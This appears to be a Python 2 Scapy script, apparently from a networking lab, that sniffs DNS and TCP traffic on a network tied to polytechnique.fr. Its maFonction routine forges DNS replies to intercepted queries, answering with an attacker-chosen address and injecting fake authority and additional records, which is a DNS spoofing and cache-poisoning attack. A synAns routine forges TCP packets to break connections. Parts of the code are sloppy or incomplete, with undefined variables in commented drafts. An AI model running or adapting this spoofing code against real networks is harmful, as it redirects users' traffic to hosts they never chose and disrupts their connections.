from scapy.all import *

class entier:
    def __init__(self):
        self.val = 0
    def inc(self):
        self.val += 1
i = entier()


ip_autorite = '129.104.32.41' # change me

### fonctions a appliquer aux pkts ###
def maFonction(a):
    i.inc()
    msg = str(i.val) + ': ' + a[IP].src + ' -> ' + a[IP].dst
    if (a[DNS].qr==0L) and ((a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a')):
        msg = msg + ' <-- REQUEST for ' + a[DNS].qd[0].qname
        print msg
        """rrname=a[DNS].qd[0].qname
        id=a[DNS].id
        d = DNS()
        d.qr = 1      #1 for Response
        d.opcode = 16
        d.aa = 0
        d.tc = 0
        d.rd = 0
        d.ra = 1
        d.z = 8
        d.rcode = 0
        d.qdcount = 1      #Question Count
        d.ancount = 1      #Answer Count
        d.nscount = 0      #No Name server info
        d.arcount = 0      #No additional records
        d.qd = str(a[DNS].qd)
        d.an = DNSRR(rrname=rrname, ttl=330, type="A", rclass="IN", rdata="127.0.0.1")
        d.ns = DNSRR(rrname = DOMAIN, type = "NS", ttl = 86400, rdata = "radius.polytechnique.fr")
        d.ar = DNSRR(rrname = "radius.polytechnique.fr", type = "A", ttl = 86400, rdata = ip_autorite)
        sendp(spoofed, iface_hint=src)"""
        spoofed_pkt = IP(dst=a[IP].src, src=a[IP].dst, id=63290)/\
                      UDP(dport=a[UDP].sport, sport=a[UDP].dport)/\
                      DNS(id=a[DNS].id, qd=a[DNS].qd, aa = 0L, qr=1L, ra = 1L, \
                      an = DNSRR(rrname=a[DNS].qd.qname,type='A',rclass='IN', ttl=23942, rdata='129.104.221.35'), \
                      arcount=8, \
                      ar = DNSRR(rrname = "ns2.nic.fr", type = "A", ttl = 105036, rdata = '192.93.0.4')/ \
                      DNSRR(rrname = "ns2.nic.fr", type = "AAAA", ttl = 134430, rdata = '2001:660:3005:1::1:2')/ \
                      DNSRR(rrname = "milou.polytechnique.fr", type = "A", ttl = 86400, rdata = '129.104.30.41')/ \
                      DNSRR(rrname = "milou.polytechnique.fr", type = "AAAA", ttl = 86400, rdata = '2001:660:3026:1:0:30:30:41')/ \
                      DNSRR(rrname = "picaros.polytechnique.fr", type = "A", ttl = 86400, rdata = '129.104.7.41')/ \
                      DNSRR(rrname = "picaros.polytechnique.fr", type = "AAAA", ttl = 86400, rdata = '2001:660:3026::7:7:41')/ \
                      DNSRR(rrname = "rackham.polytechnique.fr", type = "A", ttl = 86400, rdata = '129.104.32.41')/ \
                      DNSRR(rrname = "rackham.polytechnique.fr", type = "AAAA", ttl = 86400, rdata = '2001:660:3026::32:32:41')/ \
                      DNSRR(rrname='.',type=41,rclass=4096,ttl=0,rdata=''), \
                      nscount=4, \
                      ns = DNSRR(rrname = "polytechnique.fr", type = "NS", ttl = 86400, rdata = "rackham.polytechnique.fr")/ \
                      DNSRR(rrname = "polytechnique.fr", type = "NS", ttl = 86400, rdata = "picaros.polytechnique.fr")/ \
                      DNSRR(rrname = "polytechnique.fr", type = "NS", ttl = 86400, rdata = "milou.polytechnique.fr")/ \
                      DNSRR(rrname = "polytechnique.fr", type = "NS", ttl = 86400, rdata = "ns2.nic.fr"))
        send(spoofed_pkt)

    if (a[DNS].qr==1L) and ((a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a')) and (a[DNS].ancount>0):
        msg = msg + ' <-- ANSWER: ' + a[DNS].an[0].rdata
        print msg

def showPkt(x):         ##Print pkt:
    #x.show()           #->detaille
    print x.summary()   #->simple

def synAns(x):          ##reponse a un pkt-SYN; but: interrompre la connexion
    pIp=IP(src=x[IP].dst, dst=x[IP].src)   #id,ttl??
    ans=pIp/TCP(sport=x[TCP].dport,dport=x[TCP].sport,seq=x[TCP].ack, ack=x[TCP].seq+1, flags=0b11) #ack, seq,dataofs??
    send(ans);

### filtres ###
def monFiltre(x):
    return (x.haslayer(DNS))# and (x[DNS].qr==0L)

def tcpSyn(x):     ##Syn-pkt filter
    return x.haslayer(TCP) and (x[TCP].flags>>1 & 1 ) #SYN bit=1

def tcpAck(x):      ##Ack-pkt filter
    return x.haslayer(TCP) and (x[TCP].flags>>4 & 1 ) #ACK bit=1


#filtre = sys.argv[1]
#sniff(count = 1000,lfilter = monFiltre,prn = maFonction, timeout = 60)
sniff(count = 1000,lfilter = tcpSyn, prn= showPkt, timeout = 60)
